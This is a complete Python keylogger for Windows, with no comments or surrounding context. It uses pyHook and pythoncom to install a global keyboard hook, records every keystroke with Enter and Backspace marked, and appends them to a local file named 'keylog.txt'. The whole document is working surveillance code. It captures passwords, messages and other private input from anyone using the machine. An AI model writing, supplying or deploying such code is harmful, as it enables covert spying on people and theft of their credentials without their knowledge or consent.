import pythoncom
import pyHook

class BufferWriter(object):
    def __init__(self, filename):
        self._filename = filename
        self._buffer = ''

    def write(self, data):
        self._buffer = self._buffer + data

        if len(self._buffer) > 10:
            self.flush()

    def flush(self):
        with open(self._filename, 'a') as f:
            f.write(self._buffer)

        self._buffer = ''

bw = BufferWriter('keylog.txt')

def keypressed(event):
    if event.Ascii == 13:
        keys = ' < Enter > '
    elif event.Ascii == 8:
        keys = ' < Backspace > '
    else:
        keys = chr(event.Ascii)

    bw.write(keys)
    return True

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
